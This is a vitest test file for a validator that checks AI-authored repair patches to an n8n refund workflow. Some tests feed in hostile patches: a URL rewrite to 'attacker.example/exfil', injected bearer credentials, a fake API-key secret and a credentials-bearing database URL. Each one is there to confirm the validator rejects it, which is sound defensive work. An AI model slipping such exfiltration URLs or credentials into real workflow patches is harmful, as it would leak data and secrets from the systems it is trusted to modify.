import jsonPatch from "fast-json-patch";
import { describe, expect, it } from "vitest";

import { createCachedRepair } from "@/lib/codex/cached-repair";
import { liveCodexRepairAllowed } from "@/lib/codex/repair-agent";
import type { RegressionFixture, RepairProposal } from "@/lib/codex/schemas";
import {
  PatchValidationError,
  validateRepairProposal,
} from "@/lib/codex/patch-validator";
import {
  ingestN8nWorkflow,
  N8N_NODE_TYPES,
  type N8nWorkflowExport,
} from "@/lib/n8n";

const { applyPatch } = jsonPatch;

function regressionFixture(): RegressionFixture {
  return {
    schemaVersion: "1",
    fixture: {
      schemaVersion: "1",
      id: "fixture_refund",
      input: { event: { id: "evt_refund_001", amount: 4200 } },
      httpMocks: [{
        routeId: "refunds_create",
        method: "POST",
        path: "/refunds",
        status: 201,
        responseBody: { status: "created" },
      }],
    },
    scenarios: [{
      schemaVersion: "1",
      id: "timeout_after_refund",
      type: "effect_succeeded_then_timeout",
      targetNodeId: "http_refund",
      faultPhase: "after_effect_before_response",
      deliveries: 2,
      expectedInvariantIds: ["inv_refund_once"],
    }],
    seed: "demo-v1",
    invariant: {
      schemaVersion: "1",
      id: "inv_refund_once",
      statement: "At most one refund per event ID.",
      oracle: {
        type: "at_most_once_effect",
        effectId: "refunds",
        keyPath: "$.key",
        maximum: 1,
      },
      sourceNodeIds: ["http_refund"],
      approved: true,
    },
    expected: { beforePassed: false, afterPassed: true },
  };
}

function proposalFor(imported: ReturnType<typeof ingestN8nWorkflow>): RepairProposal {
  return createCachedRepair({
    workflow: imported.sanitizedWorkflow,
    sourceHash: imported.sourceHash,
    invariantId: "inv_refund_once",
    regressionFixture: regressionFixture(),
  });
}

function validateProposal(
  proposal: RepairProposal,
  imported: ReturnType<typeof ingestN8nWorkflow>,
) {
  return validateRepairProposal({
    proposal,
    sourceWorkflow: imported.sanitizedWorkflow,
    sourceHash: imported.sourceHash,
    approvedInvariantId: "inv_refund_once",
    expectedRegressionFixture: regressionFixture(),
  });
}

function unsafeRefundWorkflow(): N8nWorkflowExport {
  return {
    id: "wf_demo_refund",
    name: "Refund request — unsafe retry",
    active: false,
    nodes: [
      {
        id: "webhook_refund",
        name: "Refund webhook",
        type: N8N_NODE_TYPES.webhook,
        typeVersion: 2.1,
        position: [0, 0],
        parameters: { httpMethod: "POST", path: "refund", responseMode: "responseNode" },
      },
      {
        id: "normalize_event",
        name: "Normalize event",
        type: N8N_NODE_TYPES.set,
        typeVersion: 3.4,
        position: [200, 0],
        parameters: {
          mode: "manual",
          assignments: {
            assignments: [
              { id: "event", name: "event", type: "object", value: "={{ $json.event }}" },
            ],
          },
        },
      },
      {
        id: "check_event",
        name: "Check event",
        type: N8N_NODE_TYPES.if,
        typeVersion: 2.2,
        position: [400, 0],
        parameters: {
          conditions: {
            options: {},
            conditions: [
              {
                leftValue: "={{ $json.event.id }}",
                rightValue: "",
                operator: { type: "string", operation: "isNotEmpty" },
              },
            ],
          },
        },
      },
      {
        id: "http_refund",
        name: "Create refund",
        type: N8N_NODE_TYPES.httpRequest,
        typeVersion: 4.2,
        position: [600, 0],
        parameters: {
          method: "POST",
          url: "mock://refunds",
          body: { event_id: "={{ $json.event.id }}" },
        },
      },
      {
        id: "respond_ok",
        name: "Acknowledge",
        type: N8N_NODE_TYPES.respondToWebhook,
        typeVersion: 1.4,
        position: [800, 0],
        parameters: { respondWith: "json", responseBody: "={{ $json.result }}" },
      },
    ],
    connections: {
      "Refund webhook": { main: [[{ node: "Normalize event", type: "main", index: 0 }]] },
      "Normalize event": { main: [[{ node: "Check event", type: "main", index: 0 }]] },
      "Check event": { main: [[{ node: "Create refund", type: "main", index: 0 }], []] },
      "Create refund": { main: [[{ node: "Acknowledge", type: "main", index: 0 }]] },
    },
  };
}

describe("Codex repair contract", () => {
  it("creates an importable, supported n8n patch bound to the source and invariant", () => {
    const workflow = unsafeRefundWorkflow();
    const imported = ingestN8nWorkflow(JSON.stringify(workflow));
    const proposal = proposalFor(imported);

    let result;
    try {
      result = validateProposal(proposal, imported);
    } catch (error) {
      if (error instanceof PatchValidationError) {
        throw new Error(error.issues.join("\n"));
      }
      throw error;
    }
    const repaired = ingestN8nWorkflow(JSON.stringify(result.patchedWorkflow));

    expect(repaired.compatibility.canExecute).toBe(true);
    expect(repaired.sanitizedWorkflow.nodes.some((node) => node.id === "reserve_event_key")).toBe(true);
    expect(repaired.sanitizedWorkflow.nodes.some((node) => node.id === "reservation_acquired")).toBe(true);
    const normalize = repaired.sanitizedWorkflow.nodes.find(
      (node) => node.id === "normalize_event",
    );
    expect(normalize?.parameters).toMatchObject({
      assignments: {
        assignments: expect.arrayContaining([
          expect.objectContaining({
            name: "retryProofReservationValues",
            value: ["wf_demo_refund", "inv_refund_once", "={{ $json.event.id }}"],
          }),
        ]),
      },
    });
  });

  it("does not mutate the source workflow while applying the proposal", () => {
    const workflow = unsafeRefundWorkflow();
    const before = structuredClone(workflow);
    const imported = ingestN8nWorkflow(JSON.stringify(workflow));
    const proposal = proposalFor(imported);
    applyPatch(structuredClone(workflow), proposal.patch, true, false);
    expect(workflow).toEqual(before);
  });

  it("rejects repair operations that inject credentials", () => {
    const workflow = unsafeRefundWorkflow();
    const imported = ingestN8nWorkflow(JSON.stringify(workflow));
    const proposal = proposalFor(imported);
    proposal.patch.push({
      op: "add",
      path: "/nodes/3/parameters/headers",
      value: { Authorization: "Bearer secret" },
    });

    expect(() =>
      validateProposal(proposal, imported),
    ).toThrow(PatchValidationError);
  });

  it("rejects object-valued credential references", () => {
    const workflow = unsafeRefundWorkflow();
    const imported = ingestN8nWorkflow(JSON.stringify(workflow));
    const proposal = proposalFor(imported);
    proposal.patch.push({
      op: "add",
      path: "/nodes/3/credentials",
      value: { credentials: { httpHeaderAuth: { id: "cred_1" } } },
    });
    expect(() =>
      validateProposal(proposal, imported),
    ).toThrow(PatchValidationError);
  });

  it("rejects unrelated semantic changes to existing nodes", () => {
    const workflow = unsafeRefundWorkflow();
    const imported = ingestN8nWorkflow(JSON.stringify(workflow));
    const proposal = proposalFor(imported);
    proposal.patch.push({
      op: "replace",
      path: "/nodes/3/parameters/url",
      value: "https://attacker.example/exfil",
    });
    expect(() =>
      validateProposal(proposal, imported),
    ).toThrow(PatchValidationError);
  });

  it("rejects add operations that replace an existing connection root", () => {
    const workflow = unsafeRefundWorkflow();
    const imported = ingestN8nWorkflow(JSON.stringify(workflow));
    const proposal = proposalFor(imported);
    proposal.patch.push({
      op: "add",
      path: "/connections/Check event",
      value: { main: [[{ node: "Create refund", type: "main", index: 0 }], []] },
    });

    try {
      validateProposal(proposal, imported);
      throw new Error("Expected connection-root replacement to fail.");
    } catch (error) {
      expect(error).toBeInstanceOf(PatchValidationError);
      expect((error as PatchValidationError).issues).toContain(
        "Connection roots may be added only for new node names.",
      );
    }
  });

  it("rejects strong secret patterns anywhere in a proposal", () => {
    const workflow = unsafeRefundWorkflow();
    const imported = ingestN8nWorkflow(JSON.stringify(workflow));
    const proposal = proposalFor(imported);
    proposal.explanation = "The repair is ready: sk-proj-SENTINEL_EXFILTRATED_SECRET_1234567890";
    expect(() =>
      validateProposal(proposal, imported),
    ).toThrow(PatchValidationError);
  });

  it("rejects oversized model-authored proposal fields", () => {
    const workflow = unsafeRefundWorkflow();
    const imported = ingestN8nWorkflow(JSON.stringify(workflow));
    const proposal = proposalFor(imported);
    proposal.readme = "x".repeat(20_001);
    expect(() =>
      validateProposal(proposal, imported),
    ).toThrow();
  });

  it("rejects a regression fixture that is not the approved failing fixture", () => {
    const imported = ingestN8nWorkflow(JSON.stringify(unsafeRefundWorkflow()));
    const proposal = proposalFor(imported);
    proposal.regressionFixture.fixture.input = {
      event: { id: "evt_invented", amount: 4200 },
    };

    expect(() => validateProposal(proposal, imported)).toThrow(PatchValidationError);
  });

  it("rejects a repair whose branch does not test the reservation result", () => {
    const imported = ingestN8nWorkflow(JSON.stringify(unsafeRefundWorkflow()));
    const proposal = proposalFor(imported);
    const branch = proposal.patch.find(
      (operation) =>
        operation.op === "add" &&
        operation.path === "/nodes/-" &&
        typeof operation.value === "object" &&
        operation.value !== null &&
        "type" in operation.value &&
        operation.value.type === N8N_NODE_TYPES.if,
    );
    const condition = (branch as { value: { parameters: { conditions: { conditions: Array<Record<string, unknown>> } } } })
      .value.parameters.conditions.conditions[0];
    condition.leftValue = "={{ $json.attackerControlled }}";

    expect(() => validateProposal(proposal, imported)).toThrow(PatchValidationError);
  });

  it("rejects reservation values that are not bound to source, invariant, and event", () => {
    const imported = ingestN8nWorkflow(JSON.stringify(unsafeRefundWorkflow()));
    const proposal = proposalFor(imported);
    const assignment = proposal.patch.find((operation) =>
      operation.path.includes("/parameters/assignments/assignments/-"),
    );
    (assignment as { value: { value: unknown[] } }).value.value = [
      "wrong-workflow",
      "wrong-invariant",
      "constant-key",
    ];

    expect(() => validateProposal(proposal, imported)).toThrow(PatchValidationError);
  });

  it("rejects duplicate or incorrectly bound Idempotency-Key headers", () => {
    const imported = ingestN8nWorkflow(JSON.stringify(unsafeRefundWorkflow()));
    const proposal = proposalFor(imported);
    const header = proposal.patch.find((operation) =>
      operation.path.endsWith("/parameters/headerParameters"),
    );
    (header as { value: { parameters: Array<Record<string, unknown>> } }).value.parameters.unshift({
      name: "Idempotency-Key",
      value: "constant-key",
    });

    expect(() => validateProposal(proposal, imported)).toThrow(PatchValidationError);
  });

  it("rejects undeclared runtime flags on model-authored nodes", () => {
    const imported = ingestN8nWorkflow(JSON.stringify(unsafeRefundWorkflow()));
    const proposal = proposalFor(imported);
    const branch = proposal.patch.find(
      (operation) =>
        operation.path === "/nodes/-" &&
        operation.op !== "remove" &&
        typeof operation.value === "object" &&
        operation.value !== null &&
        "type" in operation.value &&
        operation.value.type === N8N_NODE_TYPES.if,
    );
    Object.assign((branch as { value: Record<string, unknown> }).value, {
      executeOnce: true,
      continueOnFail: true,
    });

    expect(() => validateProposal(proposal, imported)).toThrow(PatchValidationError);
  });

  it("rejects credential-bearing URLs anywhere in model-authored output", () => {
    const imported = ingestN8nWorkflow(JSON.stringify(unsafeRefundWorkflow()));
    const proposal = proposalFor(imported);
    proposal.explanation = [
      "Connect using postgresql",
      "://synthetic-user:synthetic-password@db.example.test/retryproof",
    ].join("");

    expect(() => validateProposal(proposal, imported)).toThrow(PatchValidationError);
  });

  it("rejects manifest change claims that do not match the patch", () => {
    const imported = ingestN8nWorkflow(JSON.stringify(unsafeRefundWorkflow()));
    const proposal = proposalFor(imported);
    proposal.manifest.changedNodeIds = ["fake-node"];

    expect(() => validateProposal(proposal, imported)).toThrow(PatchValidationError);
  });

  it("permits live Codex only for an explicit trusted local run", () => {
    expect(liveCodexRepairAllowed({ NODE_ENV: "production", CODEX_ALLOW_LOCAL_LIVE: "true" })).toBe(false);
    expect(liveCodexRepairAllowed({ NODE_ENV: "development" })).toBe(false);
    expect(liveCodexRepairAllowed({ NODE_ENV: "development", CODEX_ALLOW_LOCAL_LIVE: "true" })).toBe(true);
  });
});
